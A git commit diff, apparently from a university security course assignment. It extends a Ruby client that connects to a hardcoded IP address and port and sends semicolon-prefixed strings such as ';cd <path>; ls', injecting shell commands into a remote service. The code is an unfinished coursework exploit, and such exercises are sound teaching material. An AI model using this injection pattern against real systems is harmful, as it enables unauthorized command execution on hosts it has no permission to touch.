3674fcbf978d27e11cbe5afed06801dc0bb92d17
poch-umd <poch@terpmail.umd.edu>
2019-10-04 13:40:43 -0400

    shell.rb initial cd regex

--- week/4/writeup/shell.rb
+++ week/4/writeup/shell.rb
@@ -36,24 +36,35 @@ class CdDir
   end
 end
 
-menu = "Please enter a number:\n1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit"
+IP_ADDRESS = '157.230.179.99'
+PORT = 1337
 
 def shell wd
+  require 'socket'
   # print a shell prompt w/ the directory
   # allow the user to enter a command
   # if it's a cd command then change the CdDir
   # if it's a command then output the ; cd ; <command>
   # capture the output and show it on the screen for the user
   prompt = wd.path_prompt + '> '
+  cd_regex = /^\s*cd\s*(.+)\s*$/
   print prompt
   while input = gets.chomp do
     case input
       when /^\s*quit\s*$/i
         break
-      when /^\s*cd\s*(.+)\s*$/
-        puts selection
+      when /^\s*logout\s*$/i
+        break
+      when /^\s*exit\s*$/i
+        break
+      when cd_regex
+        wd.path = cd_regex.match( input )[ 1 ]
+        string_to_send = ";cd #{wd.path}; ls"
     end
-    require 'socket'
+    s = TCPSocket.new IP_ADDRESS, PORT
+    puts "Sending #{string_to_send}"
+    s.puts string_to_send
+    puts s.gets
     print prompt
   end
 end
@@ -62,6 +73,8 @@ def pull remote, local
   # run cat on the remote
   # capture output to the local file
 end
+
+menu = "Please enter a number:\n1. shell\n2. pull <remote-path> <local-path>\n3. help\n4. quit"
 
 wd = CdDir.new '/'
 
